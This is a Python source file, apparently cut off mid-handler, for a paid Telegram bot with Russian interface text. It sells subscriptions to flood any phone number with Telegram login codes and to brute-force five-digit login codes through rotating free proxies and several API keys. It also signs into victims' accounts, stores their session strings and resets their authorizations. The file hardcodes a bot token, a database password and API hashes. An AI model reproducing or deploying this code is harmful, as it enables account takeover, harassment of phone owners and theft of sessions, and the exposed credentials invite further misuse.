from telethon import TelegramClient, functions, types as telethon_types
from telethon.sessions import StringSession
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.utils.keyboard import InlineKeyboardBuilder
import asyncio
import logging
import os
import random
import asyncpg
import re
import requests
from datetime import datetime, timedelta

# ===== КОНФИГ =====
BOT_TOKEN = "8979594440:AAGfEOb84G4KS0kqNOfdODZVcIUXOoaELTY"
DATABASE_URL = "postgresql://postgres:ymyCAsABvLfGgkjYYJYNzjKtvpsAxJlx@postgres.railway.internal:5432/railway"
ADMIN_ID = 7989621596

# ===== ЧЁРНЫЙ СПИСОК =====
BLACKLIST_PHONES = [
    "+19314121824",
    "+79042616935",
    "+79964813813"
]

# ===== API КЛЮЧИ =====
API_KEYS = [
    {"api_id": 94575, "api_hash": "a3406de8d171bb422bb6ddf3bbd800e2"},
    {"api_id": 2040, "api_hash": "b18441a1ff607e10a989891a5462e627"},
    {"api_id": 2496, "api_hash": "8da85b0d5bfe62527e5b244c209159c3"},
    {"api_id": 17349, "api_hash": "344583e45741c457fe1862106095a5eb"},
    {"api_id": 15233, "api_hash": "d544bc5d4f6f08f1c5f9e8c7d3b2a1f4"},
]

# ===== БАЗА ДАННЫХ =====
db_pool = None

async def init_db():
    global db_pool
    db_pool = await asyncpg.create_pool(DATABASE_URL, min_size=1, max_size=10)
    async with db_pool.acquire() as conn:
        await conn.execute("""
            CREATE TABLE IF NOT EXISTS users (
                user_id BIGINT PRIMARY KEY,
                rank TEXT DEFAULT 'user',
                expire_date TEXT,
                added_date TEXT,
                daily_code_date TEXT,
                ref_code TEXT,
                ref_count INTEGER DEFAULT 0,
                total_codes_sent INTEGER DEFAULT 0
            )
        """)
        await conn.execute("""
            CREATE TABLE IF NOT EXISTS sessions (
                phone TEXT PRIMARY KEY,
                session TEXT,
                username TEXT,
                first_name TEXT,
                date TEXT
            )
        """)
        await conn.execute("""
            CREATE TABLE IF NOT EXISTS stats (
                id SERIAL PRIMARY KEY,
                phone TEXT,
                action TEXT,
                date TEXT
            )
        """)
        await conn.execute("""
            CREATE TABLE IF NOT EXISTS logs (
                id SERIAL PRIMARY KEY,
                user_id BIGINT,
                action TEXT,
                details TEXT,
                date TEXT
            )
        """)
    print("✅ PostgreSQL подключён")

async def safe_db_query(query, *args):
    async with db_pool.acquire() as conn:
        return await conn.fetch(query, *args)

async def safe_db_execute(query, *args):
    async with db_pool.acquire() as conn:
        await conn.execute(query, *args)

async def add_user_db(user_id, ref_code=None):
    await safe_db_execute(
        "INSERT INTO users (user_id, rank, expire_date, added_date, ref_code) VALUES ($1, $2, $3, $4, $5) ON CONFLICT (user_id) DO NOTHING",
        user_id, 'user', None, datetime.now().isoformat(), ref_code
    )

async def get_user_rank(user_id):
    if user_id == ADMIN_ID:
        return 'admin', None
    result = await safe_db_query("SELECT rank, expire_date FROM users WHERE user_id = $1", user_id)
    if not result:
        return 'user', None
    rank, expire_date = result[0]['rank'], result[0]['expire_date']
    if expire_date and datetime.now() > datetime.fromisoformat(expire_date):
        await set_user_rank(user_id, 'user', None)
        return 'user', None
    return rank, expire_date

async def set_user_rank(user_id, rank, expire_date=None):
    await safe_db_execute(
        "UPDATE users SET rank = $1, expire_date = $2 WHERE user_id = $3",
        rank, expire_date, user_id
    )

async def get_users_db():
    result = await safe_db_query("SELECT user_id, rank, expire_date FROM users")
    return [(r['user_id'], r['rank'], r['expire_date']) for r in result]

async def save_session_db(phone, session, username, first_name):
    await safe_db_execute(
        "INSERT INTO sessions (phone, session, username, first_name, date) VALUES ($1, $2, $3, $4, $5) ON CONFLICT (phone) DO UPDATE SET session = $2, username = $3, first_name = $4, date = $5",
        phone, session, username, first_name, datetime.now().isoformat()
    )

async def get_all_sessions():
    result = await safe_db_query("SELECT phone, session, username, first_name, date FROM sessions")
    return [(r['phone'], r['session'], r['username'], r['first_name'], r['date']) for r in result]

async def log_stats(phone, action):
    await safe_db_execute(
        "INSERT INTO stats (phone, action, date) VALUES ($1, $2, $3)",
        phone, action, datetime.now().isoformat()
    )

async def get_stats_db():
    total = await safe_db_query("SELECT COUNT(*) FROM stats")
    last = await safe_db_query("SELECT phone, action, date FROM stats ORDER BY id DESC LIMIT 10")
    return total[0]['count'], [(r['phone'], r['action'], r['date']) for r in last]

async def log_action(user_id, action, details=''):
    await safe_db_execute(
        "INSERT INTO logs (user_id, action, details, date) VALUES ($1, $2, $3, $4)",
        user_id, action, details, datetime.now().isoformat()
    )

async def get_logs(limit=20):
    result = await safe_db_query("SELECT user_id, action, details, date FROM logs ORDER BY id DESC LIMIT $1", limit)
    return [(r['user_id'], r['action'], r['details'], r['date']) for r in result]

async def add_codes_sent(user_id, count):
    await safe_db_execute(
        "UPDATE users SET total_codes_sent = total_codes_sent + $1 WHERE user_id = $2",
        count, user_id
    )

async def get_codes_sent(user_id):
    result = await safe_db_query("SELECT total_codes_sent FROM users WHERE user_id = $1", user_id)
    return result[0]['total_codes_sent'] if result else 0

async def get_ref_count(user_id):
    result = await safe_db_query("SELECT ref_count FROM users WHERE user_id = $1", user_id)
    return result[0]['ref_count'] if result else 0

async def add_ref_count(user_id, count=1):
    await safe_db_execute(
        "UPDATE users SET ref_count = ref_count + $1 WHERE user_id = $2",
        count, user_id
    )

async def get_daily_code_status(user_id):
    result = await safe_db_query("SELECT daily_code_date FROM users WHERE user_id = $1", user_id)
    if not result or not result[0]['daily_code_date']:
        return True
    last_date = datetime.fromisoformat(result[0]['daily_code_date'])
    return (datetime.now() - last_date).days >= 1

async def set_daily_code_used(user_id):
    await safe_db_execute(
        "UPDATE users SET daily_code_date = $1 WHERE user_id = $2",
        datetime.now().isoformat(), user_id
    )

# ===== НАСТРОЙКА =====
logging.basicConfig(level=logging.INFO)
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()
user_states = {}

def is_admin(user_id):
    return user_id == ADMIN_ID

def is_phone_blacklisted(phone):
    for bl in BLACKLIST_PHONES:
        if bl in phone or phone in bl:
            return True
    return False

# ===== ПРОКСИ =====
PROXY_POOL = []
WORKING_PROXIES = []

def load_proxies():
    global PROXY_POOL
    PROXY_POOL = []
    proxy_sources = [
        "https://raw.githubusercontent.com/Thordata/awesome-free-proxy-list/main/proxies/http.txt",
        "https://raw.githubusercontent.com/Thordata/awesome-free-proxy-list/main/proxies/socks5.txt",
        "https://raw.githubusercontent.com/komutan234/Proxy-List-Free/main/proxies/http.txt",
        "https://raw.githubusercontent.com/komutan234/Proxy-List-Free/main/proxies/socks5.txt",
        "https://raw.githubusercontent.com/gfpcom/free-proxy-list/main/lists/http.txt",
        "https://raw.githubusercontent.com/gfpcom/free-proxy-list/main/lists/socks5.txt",
    ]
    for url in proxy_sources:
        try:
            response = requests.get(url, timeout=10)
            if response.status_code == 200:
                proxies = [line.strip() for line in response.text.split('\n') if line.strip()]
                for proxy in proxies:
                    if proxy not in PROXY_POOL:
                        PROXY_POOL.append(proxy)
                print(f"✅ Загружено {len(proxies)} прокси из {url}")
        except Exception as e:
            print(f"❌ Ошибка загрузки {url}: {e}")
    print(f"📊 Всего прокси: {len(PROXY_POOL)}")
    return PROXY_POOL

def check_proxy(proxy):
    try:
        test = requests.get("https://api.telegram.org", proxies={"http": proxy, "https": proxy}, timeout=5)
        return test.status_code == 200
    except:
        return False

def get_working_proxy():
    if WORKING_PROXIES:
        proxy = random.choice(WORKING_PROXIES)
        if check_proxy(proxy):
            return proxy
        else:
            WORKING_PROXIES.remove(proxy)
            return get_working_proxy()
    return None

# ===== СЛОВАРЬ =====
SMART_DICT = [
    "12345", "00000", "11111", "22222", "33333", "44444", "55555",
    "66666", "77777", "88888", "99999", "54321", "12340",
    "12321", "01234", "98765", "23456", "34567", "45678", "56789",
    "87654", "76543", "65432", "0101", "0202", "0303", "0404", "0505",
    "0606", "0707", "0808", "0909", "1010", "1111", "1212", "1231", "1225",
]

# ===== ПОЛУЧАЕМ USERNAME =====
async def get_bot_username():
    me = await bot.get_me()
    return me.username

# ===== КЛАВИАТУРЫ =====
def shop_keyboard():
    builder = InlineKeyboardBuilder()
    builder.row(
        InlineKeyboardButton(text="🔓 UNLOCK месяц 99 ₽", callback_data="buy_unlock"),
        InlineKeyboardButton(text="🔓 UNLOCK навсегда 799 ₽", callback_data="buy_unlock_forever")
    )
    builder.row(
        InlineKeyboardButton(text="💎 VIP месяц 199 ₽", callback_data="buy_vip"),
        InlineKeyboardButton(text="💎 VIP навсегда 1999 ₽", callback_data="buy_vip_forever")
    )
    builder.row(
        InlineKeyboardButton(text="⚡ Брутфорс 1 номер 119 ₽", callback_data="buy_bruteforce"),
        InlineKeyboardButton(text="⚡ Брутфорс 5 номеров 500 ₽", callback_data="buy_bruteforce_5")
    )
    builder.row(
        InlineKeyboardButton(text="🤖 АнтиБот месяц 199 ₽", callback_data="buy_antibot")
    )
    builder.row(InlineKeyboardButton(text="🔙 Назад", callback_data="back"))
    return builder.as_markup()

def get_product_links():
    return {
        "bruteforce": {"name": "⚡ Брутфорс 1 номер", "price": "119 ₽ (1.5$)", "link": "http://t.me/send?start=IVZJCvYwUc8C"},
        "bruteforce_5": {"name": "⚡ Брутфорс 5 номеров", "price": "500 ₽ (6.3$)", "link": "http://t.me/send?start=IVULVz96o0NQ"},
        "unlock": {"name": "🔓 UNLOCK месяц", "price": "99 ₽ (1.2$)", "link": "http://t.me/send?start=IVzJRBFjchnb"},
        "unlock_forever": {"name": "🔓 UNLOCK навсегда", "price": "799 ₽ (10$)", "link": "http://t.me/send?start=IVtaoL6KvIhV"},
        "vip": {"name": "💎 VIP месяц", "price": "199 ₽ (2.5$)", "link": "http://t.me/send?start=IV83endACqV3"},
        "vip_forever": {"name": "💎 VIP навсегда", "price": "1999 ₽ (20$)", "link": "http://t.me/send?start=IVqj0t9rdzAH"},
        "antibot": {"name": "🤖 АнтиБот месяц", "price": "199 ₽ (2.5$)", "link": "http://t.me/send?start=IVtaoL6KvIhV"}
    }

def admin_keyboard():
    builder = InlineKeyboardBuilder()
    builder.row(
        InlineKeyboardButton(text="🔓 Выдать UNLOCK", callback_data="admin_set_unlock"),
        InlineKeyboardButton(text="💎 Выдать VIP", callback_data="admin_set_vip")
    )
    builder.row(
        InlineKeyboardButton(text="🤖 Выдать АнтиБот", callback_data="admin_set_antibot"),
        InlineKeyboardButton(text="🚫 Снять подписку", callback_data="admin_remove_rank")
    )
    builder.row(
        InlineKeyboardButton(text="🚫 Удалить из ЧС", callback_data="admin_remove_blacklist"),
        InlineKeyboardButton(text="📋 Пользователи", callback_data="admin_list_users")
    )
    builder.row(
        InlineKeyboardButton(text="📊 Статистика", callback_data="admin_stats"),
        InlineKeyboardButton(text="📜 Логи", callback_data="admin_logs")
    )
    builder.row(
        InlineKeyboardButton(text="📨 Рассылка", callback_data="admin_notify"),
        InlineKeyboardButton(text="🔑 Сброс сессий", callback_data="reset_sessions")
    )
    builder.row(InlineKeyboardButton(text="🔙 Назад", callback_data="back"))
    return builder.as_markup()

def back_keyboard():
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(text="🔙 Назад", callback_data="back"))
    return builder.as_markup()

def progress_bar(current, total, length=20):
    if total == 0:
        total = 1
    filled = int((current / total) * length)
    bar = '█' * filled + '░' * (length - filled)
    percent = int((current / total) * 100)
    return f"┃{bar}┃ {percent}%"

# ===== ПУЛ КЛИЕНТОВ =====
class TelegramPool:
    def __init__(self, api_keys, pool_size=10):
        self.api_keys = api_keys
        self.pool_size = pool_size
        self.clients = []
        self.lock = asyncio.Lock()
        self.current_index = 0
        self.last_used = {}
    
    async def get_client(self):
        async with self.lock:
            while len(self.clients) < self.pool_size:
                key = self.api_keys[len(self.clients) % len(self.api_keys)]
                proxy = get_working_proxy()
                if proxy:
                    client = TelegramClient(f'pool_{len(self.clients)}', key["api_id"], key["api_hash"], proxy=("http", proxy))
                else:
                    client = TelegramClient(f'pool_{len(self.clients)}', key["api_id"], key["api_hash"])
                await client.connect()
                self.clients.append((client, key))
                self.last_used[len(self.clients)-1] = datetime.now()
            min_used = min(self.last_used, key=self.last_used.get)
            self.current_index = min_used
            self.last_used[min_used] = datetime.now()
            return self.clients[self.current_index]
    
    async def close_all(self):
        for client, _ in self.clients:
            try:
                await client.disconnect()
            except:
                pass

pool = TelegramPool(API_KEYS, pool_size=10)

async def send_code_fast_pool(phone):
    if is_phone_blacklisted(phone):
        return {"success": False, "error": "Номер в чёрном списке"}
    client = None
    try:
        client, key = await pool.get_client()
        result = await client(functions.auth.SendCodeRequest(
            phone_number=phone,
            api_id=key["api_id"],
            api_hash=key["api_hash"],
            settings=telethon_types.CodeSettings()
        ))
        return {"success": True, "hash": result.phone_code_hash}
    except Exception as e:
        return {"success": False, "error": str(e)}
    finally:
        if client:
            try:
                await client.disconnect()
            except:
                pass

async def send_with_smart_wait(phone, max_retries=3):
    for attempt in range(max_retries):
        result = await send_code_fast_pool(phone)
        if result["success"]:
            return result
        error = result.get("error", "")
        wait_match = re.search(r'wait of (\d+) seconds', error)
        if wait_match:
            wait_seconds = min(int(wait_match.group(1)) + 3, 120)
            await asyncio.sleep(wait_seconds)
            continue
        await asyncio.sleep(3)
    return {"success": False, "error": "Превышено число попыток"}

async def spam_codes(phone, count, progress_callback=None):
    results = []
    sent = 0
    failed = 0
    current_wait = 0
    
    for i in range(count):
        if current_wait > 0:
            wait_time = min(current_wait + 3, 120)
            results.append(f"⏳ Ожидание {wait_time} сек...")
            await asyncio.sleep(wait_time)
            current_wait = 0
        
        result = await send_with_smart_wait(phone)
        
        if result["success"]:
            sent += 1
            results.append(f"✅ Код {i+1} отправлен")
            await log_stats(phone, f"spam_{i+1}")
        else:
            error = result.get("error", "")
            if "wait of" in error.lower():
                wait_match = re.search(r'wait of (\d+) seconds', error)
                current_wait = int(wait_match.group(1)) if wait_match else 30
                results.append(f"⏳ Ожидание {current_wait} сек")
                continue
            failed += 1
            results.append(f"❌ Код {i+1}: {error}")
        
        if progress_callback:
            await progress_callback(i + 1, count)
        await asyncio.sleep(random.uniform(1.5, 3))
    
    return results, sent, failed

async def login_with_code(phone, code):
    result = await send_code_fast_pool(phone)
    if not result["success"]:
        return {"success": False, "error": result["error"]}
    hash = result["hash"]
    
    client = None
    try:
        client, key = await pool.get_client()
        await client.sign_in(phone=phone, code=code, phone_code_hash=hash)
        me = await client.get_me()
        session_string = client.session.save()
        await save_session_db(phone, session_string, me.username, me.first_name)
        await log_stats(phone, "login")
        return {"success": True, "username": me.username, "first_name": me.first_name, "phone": phone}
    except Exception as e:
        return {"success": False, "error": str(e)}
    finally:
        if client:
            try:
                await client.disconnect()
            except:
                pass

async def login_with_retry(phone, code):
    for i in range(3):
        result = await login_with_code(phone, code)
        if result["success"]:
            return result
        await asyncio.sleep(2)
    return {"success": False, "error": "3 попытки не удались"}

async def bruteforce_block_reverse(phone, hash, start, end, progress_callback=None):
    total = end - start
    if total == 0:
        total = 1
    for idx, code in enumerate(range(start, end - 1, -1)):
        client = None
        try:
            client, key = await pool.get_client()
            await client.sign_in(phone=phone, code=str(code).zfill(5), phone_code_hash=hash)
            return str(code).zfill(5)
        except:
            if progress_callback and idx % 10 == 0:
                await progress_callback(idx + 1, total)
            continue
        finally:
            if client:
                try:
                    await client.disconnect()
                except:
                    pass
    return None

async def fast_bruteforce_reverse(phone, progress_callback=None):
    result = await send_code_fast_pool(phone)
    if not result["success"]:
        return {"success": False, "error": result["error"]}
    
    hash = result["hash"]
    total_codes = 100000
    
    for idx, code in enumerate(SMART_DICT[::-1]):
        client = None
        try:
            client, key = await pool.get_client()
            await client.sign_in(phone=phone, code=code, phone_code_hash=hash)
            return {"success": True, "code": code, "method": "словарь"}
        except:
            if progress_callback:
                await progress_callback(idx + 1, len(SMART_DICT))
            continue
        finally:
            if client:
                try:
                    await client.disconnect()
                except:
                    pass
    
    tasks = []
    block_size = 2000
    for start in range(total_codes - 1, -1, -block_size):
        end = max(start - block_size + 1, 0)
        tasks.append(bruteforce_block_reverse(phone, hash, start, end, progress_callback))
    
    results = await asyncio.gather(*tasks)
    for r in results:
        if r:
            return {"success": True, "code": r, "method": "параллельный"}
    
    return {"success": False}

# ===== КОМАНДЫ =====
@dp.message(Command("start"))
async def start(message: types.Message):
    user_id = message.from_user.id
    await add_user_db(user_id)
    rank, expire = await get_user_rank(user_id)
    
    rank_names = {
        'admin': '👑 АДМИН',
        'vip': '💎 VIP',
        'antibot': '🤖 АнтиБот',
        'unlock': '🔓 UNLOCK',
        'user': '👤 ПОЛЬЗОВАТЕЛЬ'
    }
    
    rank_display = rank_names.get(rank, '👤 ПОЛЬЗОВАТЕЛЬ')
    if expire and rank != 'admin':
        try:
            days = (datetime.fromisoformat(expire) - datetime.now()).days
            rank_display += f" (осталось {days} дн.)"
        except:
            pass
    
    args = message.text.split()
    if len(args) > 1 and args[1].startswith("ref_"):
        try:
            ref_code = args[1][4:]
            ref_user_id = int(ref_code)
            if ref_user_id != user_id:
                await add_ref_count(ref_user_id, 5)
                await add_ref_count(user_id, 2)
                await message.answer("🎁 +2 бонусных кода за переход по реферальной ссылке!")
        except:
            pass
    
    await message.answer(
        f"⚡ ПОМОЩНИК С КОДАМИ\n\n"
        f"Твой ранг: {rank_display}",
        reply_markup=await main_keyboard(user_id)
    )

async def main_keyboard(user_id):
    builder = InlineKeyboardBuilder()
    rank, _ = await get_user_rank(user_id)
    
    builder.row(InlineKeyboardButton(text="📤 Отправить код", callback_data="send_code"))
    builder.row(InlineKeyboardButton(text="👤 Профиль", callback_data="profile"))
    builder.row(InlineKeyboardButton(text="💳 Магазин", callback_data="shop"))
    
    if rank == 'vip' or rank == 'admin':
        builder.row(
            InlineKeyboardButton(text="🔑 Вход по коду", callback_data="login_code"),
            InlineKeyboardButton(text="⚡ Брутфорс", callback_data="bruteforce")
        )
        builder.row(InlineKeyboardButton(text="✅ Сессии", callback_data="check_sessions"))
    
    if is_admin(user_id):
        builder.row(InlineKeyboardButton(text="👑 Админ-панель", callback_data="admin_panel"))
    
    return builder.as_markup()

# ===== CALLBACK HANDLER =====
@dp.callback_query()
async def callback_handler(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    rank, _ = await get_user_rank(user_id)
    
    if not is_admin(user_id) and rank not in ['unlock', 'vip', 'antibot', 'admin']:
        await callback.answer("🚫 Нет доступа", show_alert=True)
        return
    
    data = callback.data
    
    if data == "back":
        await callback.message.edit_text(
            "⚡ ПОМОЩНИК С КОДАМИ",
            reply_markup=await main_keyboard(user_id)
        )
        await callback.answer()
        return
    
    if data == "shop":
        await callback.message.edit_text("💳 МАГАЗИН", reply_markup=shop_keyboard())
        await callback.answer()
        return
    
    if data == "profile":
        rank, expire = await get_user_rank(user_id)
        ref_count = await get_ref_count(user_id)
        codes_sent = await get_codes_sent(user_id)
        rank_names = {'admin': '👑 АДМИН', 'vip': '💎 VIP', 'antibot': '🤖 АнтиБот', 'unlock': '🔓 UNLOCK', 'user': '👤 ПОЛЬЗОВАТЕЛЬ'}
        bot_username = await get_bot_username()
        await callback.message.edit_text(
            f"👤 ПРОФИЛЬ\n\n"
            f"Ранг: {rank_names.get(rank, '👤 ПОЛЬЗОВАТЕЛЬ')}\n"
            f"Реферальная ссылка: https://t.me/{bot_username}?start=ref_{user_id}\n"
            f"Отправлено кодов: {codes_sent}\n"
            f"Приведено друзей: {ref_count}",
            reply_markup=back_keyboard()
        )
        await callback.answer()
        return
    
    if data.startswith("buy_"):
        product_key = data.replace("buy_", "")
        products = get_product_links()
        if product_key in products:
            product = products[product_key]
            keyboard = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="💳 Оплатить", url=product["link"])],
                [InlineKeyboardButton(text="🔙 Назад", callback_data="shop")]
            ])
            await callback.message.edit_text(
                f"💳 ОФОРМЛЕНИЕ ЗАКАЗА\n\n"
                f"Товар: {product['name']}\n"
                f"Цена: {product['price']}",
                reply_markup=keyboard
            )
            await callback.answer()
            return
    
    if data == "admin_panel":
        if not is_admin(user_id):
            await callback.answer("❌ Только для админа", show_alert=True)
            return
        await callback.message.edit_text("👑 АДМИН-ПАНЕЛЬ", reply_markup=admin_keyboard())
        await callback.answer()
        return
    
    if data == "admin_set_unlock":
        if not is_admin(user_id):
            await callback.answer("❌ Только для админа", show_alert=True)
            return
        await callback.message.edit_text("🔓 Введи ID для UNLOCK:", reply_markup=back_keyboard())
        user_states[user_id] = {"action": "admin_set_unlock"}
        await callback.answer()
        return
    
    if data == "admin_set_vip":
        if not is_admin(user_id):
            await callback.answer("❌ Только для админа", show_alert=True)
            return
        await callback.message.edit_text("💎 Введи ID для VIP:", reply_markup=back_keyboard())
        user_states[user_id] = {"action": "admin_set_vip"}
        await callback.answer()
        return
    
    if data == "admin_set_antibot":
        if not is_admin(user_id):
            await callback.answer("❌ Только для админа", show_alert=True)
            return
        await callback.message.edit_text("🤖 Введи номер для АнтиБот:", reply_markup=back_keyboard())
        user_states[user_id] = {"action": "admin_set_antibot"}
        await callback.answer()
        return
    
    if data == "admin_remove_rank":
        if not is_admin(user_id):
            await callback.answer("❌ Только для админа", show_alert=True)
            return
        await callback.message.edit_text("🚫 Введи ID для снятия подписки:", reply_markup=back_keyboard())
        user_states[user_id] = {"action": "admin_remove_rank"}
        await callback.answer()
        return
    
    if data == "admin_remove_blacklist":
        if not is_admin(user_id):
            await callback.answer("❌ Только для админа", show_alert=True)
            return
        await callback.message.edit_text("🚫 Введи номер для удаления из ЧС:", reply_markup=back_keyboard())
        user_states[user_id] = {"action": "admin_remove_blacklist"}
        await callback.answer()
        return
    
    if data == "admin_list_users":
        if not is_admin(user_id):
            await callback.answer("❌ Только для админа", show_alert=True)
            return
        users = await get_users_db()
        text = "📋 ПОЛЬЗОВАТЕЛИ:\n\n"
        for u, rank, expire in users:
            if u == ADMIN_ID:
                status = "👑 ADMIN"
            else:
                status = f"{rank.upper()}" if rank != 'user' else "👤 USER"
            text += f"{status} — {u}\n"
        await callback.message.edit_text(text[:4000], reply_markup=back_keyboard())
        await callback.answer()
        return
    
    if data == "admin_stats":
        if not is_admin(user_id):
            await callback.answer("❌ Только для админа", show_alert=True)
            return
        total, last = await get_stats_db()
        text = f"📊 СТАТИСТИКА\n\nВсего действий: {total}\n"
        for phone, action, date in last:
            text += f"• {phone} — {action} ({date[:16]})\n"
        await callback.message.edit_text(text, reply_markup=back_keyboard())
        await callback.answer()
        return
    
    if data == "admin_logs":
        if not is_admin(user_id):
            await callback.answer("❌ Только для админа", show_alert=True)
            return
        logs = await get_logs(20)
        text = "📜 ПОСЛЕДНИЕ ЛОГИ:\n\n"
        for uid, action, details, date in logs:
            text += f"👤 {uid}\n⚡ {action}\n📝 {details}\n🕐 {date[:16]}\n\n"
        await callback.message.edit_text(text[:4000], reply_markup=back_keyboard())
        await callback.answer()
        return
    
    if data == "admin_notify":
        if not is_admin(user_id):
            await callback.answer("❌ Только для админа", show_alert=True)
            return
        await callback.message.edit_text("📨 Введи текст рассылки:", reply_markup=back_keyboard())
        user_states[user_id] = {"action": "admin_notify"}
        await callback.answer()
        return
    
    if data == "reset_sessions":
        if not is_admin(user_id):
            await callback.answer("❌ Только для админа", show_alert=True)
            return
        sessions = await get_all_sessions()
        if not sessions:
            await callback.message.edit_text("❌ Нет сессий", reply_markup=back_keyboard())
            await callback.answer()
            return
        try:
            phone, session, username, first_name, date = sessions[0]
            client = TelegramClient(StringSession(session), random.choice(API_KEYS)["api_id"], random.choice(API_KEYS)["api_hash"])
            await client.connect()
            await client(functions.auth.ResetAuthorizationsRequest())
            await client.disconnect()
            await callback.message.edit_text(f"✅ Сессии сброшены для {phone}", reply_markup=back_keyboard())
        except Exception as e:
            await callback.message.edit_text(f"❌ Ошибка: {e}", reply_markup=back_keyboard())
        await callback.answer()
        return
    
    if data == "send_code":
        await callback.message.edit_text(
            "📤 Введи номер и количество\nПример: +71234567890 1",
            reply_markup=back_keyboard()
        )
        user_states[user_id] = {"action": "waiting_spam"}
        await callback.answer()
        return
    
    if data == "login_code":
        if rank not in ['vip', 'admin']:
            await callback.answer("💎 Только для VIP", show_alert=True)
            return
        await callback.message.edit_text("🔑 Введи номер и код:\n+79031234567 12345", reply_markup=back_keyboard())
        user_states[user_id] = {"action": "waiting_login"}
        await callback.answer()
        return
    
    if data == "bruteforce":
        if rank not in ['vip', 'admin']:
            await callback.answer("💎 Только для VIP", show_alert=True)
            return
        await callback.message.edit_text("⚡ Введи номер:\n+79031234567", reply_markup=back_keyboard())
        user_states[user_id] = {"action": "waiting_bruteforce"}
        await callback.answer()
        return
    
    if data == "check_sessions":
        if rank not in ['vip', 'admin']:
            await callback.answer("💎 Только для VIP", show_alert=True)
            return
        sessions = await get_all_sessions()
        text = f"✅ СЕССИЙ: {len(sessions)}\n\n"
        for phone, session, username, first_name, date in sessions:
            text += f"📱 {phone} (@{username})\n"
        await callback.message.edit_text(text[:4000], reply_markup=back_keyboard())
        await callback.answer()
        return

# ===== ОБРАБОТЧИК ТЕКСТА =====
@dp.message()
async def text_handler(message: types.Message):
    user_id = message.from_user.id
    rank, _ = await get_user_rank(user_id)
    
    if rank == 'user':
        await message.answer("🚫 Нет доступа. Купи подписку!")
        return
    
    if user_id not in user_states:
        await message.answer("Используй кнопки", reply_markup=await main_keyboard(user_id))
        return
    
    action = user_states[user_id].get("action")
    text = message.text.strip()
    
    if not text:
        await message.answer("❌ Введите текст")
        return
    
    # ===== ADMIN: ВЫДАТЬ UNLOCK =====
    if action == "admin_set_unlock":
        if not is_admin(user_id):
            await message.answer("❌ Только для админа")
            del user_states[user_id]
            return
        try:
            target = int(text)
            expire = (datetime.now() + timedelta(days=30)).isoformat()
            await set_user_rank(target, 'unlock', expire)
            await log_action(user_id, "set_unlock", str(target))
            try:
                await bot.send_message(target, f"⚒️ Вам выдан UNLOCK на 30 дней")
            except:
                pass
            await message.answer(f"✅ {target} теперь UNLOCK")
        except:
            await message.answer("❌ Введи ID")
        await message.answer("👑 Админ-панель", reply_markup=admin_keyboard())
        del user_states[user_id]
        return
    
    # ===== ADMIN: ВЫДАТЬ VIP =====
    if action == "admin_set_vip":
        if not is_admin(user_id):
            await message.answer("❌ Только для админа")
            del user_states[user_id]
            return
        try:
            target = int(text)
            expire = (datetime.now() + timedelta(days=30)).isoformat()
            await set_user_rank(target, 'vip', expire)
            await log_action(user_id, "set_vip", str(target))
            try:
                await bot.send_message(target, f"⚒️ Вам выдан VIP на 30 дней")
            except:
                pass
            await message.answer(f"✅ {target} теперь VIP")
        except:
            await message.answer("❌ Введи ID")
        await message.answer("👑 Админ-панель", reply_markup=admin_keyboard())
        del user_states[user_id]
        return
    
    # ===== ADMIN: ВЫДАТЬ АНТИБОТ =====
    if action == "admin_set_antibot":
        if not is_admin(user_id):
            await message.answer("❌ Только для админа")
            del user_states[user_id]
            return
        
        phone = text.strip()
        if not phone.startswith('+'):
            phone = '+' + phone
        
        sessions = await get_all_sessions()
        target = None
        
        for p, session, username, first_name, date in sessions:
            if p == phone:
                client = None
                try:
                    client = TelegramClient(StringSession(session), random.choice(API_KEYS)["api_id"], random.choice(API_KEYS)["api_hash"])
                    await client.connect()
                    me = await client.get_me()
                    users = await get_users_db()
                    for u, rank, expire in users:
                        if str(me.id) == str(u):
                            target = u
                            break
                    if target:
                        break
                except:
                    pass
                finally:
                    if client:
                        try:
                            await client.disconnect()
                        except:
                            pass
        
        if not target:
            await message.answer(f"❌ Номер {phone} не найден")
        else:
            expire = (datetime.now() + timedelta(days=30)).isoformat()
            await set_user_rank(target, 'antibot', expire)
            await log_action(user_id, "set_antibot", str(target))
            try:
                await bot.send_message(target, f"⚒️ Вам выдан АнтиБот на 30 дней")
            except:
                pass
            await message.answer(f"✅ {target} теперь АнтиБот")
        
        await message.answer("👑 Админ-панель", reply_markup=admin_keyboard())
        del user_states[user_id]
        return
    
    # ===== ADMIN: СНЯТЬ ПОДПИСКУ =====
    if action == "admin_remove_rank":
        if not is_admin(user_id):
            await message.answer("❌ Только для админа")
            del user_states[user_id]
            return
        try:
            target = int(text)
            if target == ADMIN_ID:
                await message.answer("❌ Нельзя снять админа")
            else:
                await set_user_rank(target, 'user', None)
                await log_action(user_id, "remove_rank", str(target))
                try:
                    await bot.send_message(target, "🚫 Ваша подписка снята")
                except:
                    pass
                await message.answer(f"✅ Подписка снята с {target}")
        except:
            await message.answer("❌ Введи ID")
        await message.answer("👑 Админ-панель", reply_markup=admin_keyboard())
        del user_states[user_id]
        return
    
    # ===== ADMIN: УДАЛИТЬ ИЗ ЧС =====
    if action == "admin_remove_blacklist":
        if not is_admin(user_id):
            await message.answer("❌ Только для админа")
            del user_states[user_id]
            return
        phone = text.strip()
        if phone in BLACKLIST_PHONES:
            BLACKLIST_PHONES.remove(phone)
            await message.answer(f"✅ {phone} удалён из ЧС")
            await log_action(user_id, "remove_blacklist", phone)
        else:
            await message.answer(f"❌ {phone} не найден в ЧС")
        await message.answer("👑 Админ-панель", reply_markup=admin_keyboard())
        del user_states[user_id]
        return
    
    # ===== ADMIN: РАССЫЛКА =====
    if action == "admin_notify":
        if not is_admin(user_id):
            await message.answer("❌ Только для админа")
            del user_states[user_id]
            return
        users = await get_users_db()
        sent = 0
        for u, rank, expire in users:
            try:
                await bot.send_message(u, text)
                sent += 1
                await asyncio.sleep(0.1)
            except:
                pass
        await log_action(user_id, "notify", f"{sent} пользователей")
        await message.answer(f"✅ Отправлено {sent} пользователям")
        await message.answer("👑 Админ-панель", reply_markup=admin_keyboard())
        del user_states[user_id]
        return
    
    # ===== ОТПРАВКА КОДОВ =====
    if action == "waiting_spam":
        parts = text.split()
        if len(parts) != 2:
            await message.answer("❌ Формат: +71234567890 1")
            return
        
        phone = parts[0]
